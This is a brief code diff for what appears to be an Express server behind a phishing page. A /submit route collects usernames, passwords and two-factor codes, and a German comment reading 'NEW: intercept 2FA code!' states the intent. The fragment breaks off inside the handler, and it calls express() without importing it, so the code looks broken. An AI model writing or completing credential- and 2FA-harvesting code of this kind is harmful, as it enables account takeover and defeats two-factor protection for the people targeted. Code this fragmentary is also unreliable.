@@ -1,3 +1,14 @@
+const bodyParser = require('body-parser');
+const path = require('path');
+const fs = require('fs');
+const fetch = require('node-fetch');
+
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+app.use(bodyParser.urlencoded({ extended: true }));
+app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.json());
 app.post('/submit', async (req, res) => {
   try {
     const { username, password, twoFACode } = req.body; // NEU: 2FA-Code abfangen!
